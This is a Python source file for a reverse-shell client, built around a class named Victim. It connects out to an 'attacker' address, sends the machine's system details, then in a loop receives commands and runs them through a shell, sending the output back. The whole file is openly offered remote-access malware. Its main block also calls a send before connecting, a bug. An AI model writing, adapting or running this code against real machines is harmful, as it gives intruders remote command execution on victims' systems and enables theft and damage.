import os
import socket
import subprocess
import platform
import psutil

class Victim:
  def __init__(self, server_ip, server_port):
    self.server_ip = server_ip
    self.server_port = server_port
    self.client = None

  def get_local_ip(self):
    # Get the local IP address of the victim's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

  def connect_to_server(self):
    local_ip = self.get_local_ip()
    self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("Msg: Client Initiated...")
    self.client.connect((self.server_ip, self.server_port))
    print("Msg: Connection initiated...")

  def send_system_info(self):
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"

    self.client.send(system_info.encode())

  def online_interaction(self):
    self.send_system_info() # Send system information when connected
    while True:
        print("[+] Awaiting Shell Commands...")
        user_command = self.client.recv(1024).decode()

        if user_command.strip() == "exit":
            break

        # Check if the command is for changing directory
        if user_command.startswith("cd"):
            try:
                # Extract the directory path from the command
                directory_path = user_command.split(" ", 1)[1]  # Split only once to preserve spaces
                # Change directory
                os.chdir(directory_path)
                # Send confirmation message to the attacker
                self.client.send(f"Changed directory to: {os.getcwd()}".encode())
            except Exception as e:
                # If an error occurs, send error message to the attacker
                self.client.send(f"Error changing directory: {str(e)}".encode())
        else:
            # Execute other commands
            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()

            print("[+] Sending Command Output...")
            if output == b"" and output_error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                self.client.send(output + output_error)



if __name__ == "__main__":
  attacker_ip =  '127.0.0.1'
  victim = Victim(attacker_ip, 4000) # Pass the local IP address
  victim.send_system_info()
  victim.connect_to_server()
  victim.online_interaction()
